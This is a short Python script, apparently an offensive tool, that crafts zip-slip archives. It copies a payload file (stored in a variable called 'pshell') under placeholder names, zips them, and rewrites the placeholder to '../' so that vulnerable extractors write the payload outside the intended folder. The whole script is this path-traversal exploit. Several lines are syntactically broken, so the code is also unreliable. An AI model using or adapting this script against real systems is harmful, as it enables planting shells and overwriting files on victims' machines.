"""
"insecure unzip 
rename files in archives ../../../file

"""
from  sys import argv,exit
import os
try :
  file_name = argv[1]
  lenght = int(argv[2])
  with open(file_name,"rb") as f:
      pshell = f.read()
except:
  print("[-] give valid file path\n usage sprayer.py <file_path> <number_of_dot_dot_pwn>")
  exit(0)
spray = "ZZY"
for i in range(1,lenght):
  with open(spray*i+file_name,"wb") as f:
    f.write(pshell)
os.system("zip -0 malv1.zip ZZY*") 
os.system("zip malv2.zip ZZY*") 
os.system("rm ZZY*"+file_name+)
with open("malv1.zip","rb")as f:
    v1 = f.read()
    with open("malv1pwn.zip","wb") as f:
      f.write(v1.replace("ZZY","../")
 
      
    
print("[+] done > malv1pwn.zip - malv2.zip")
 
 
  
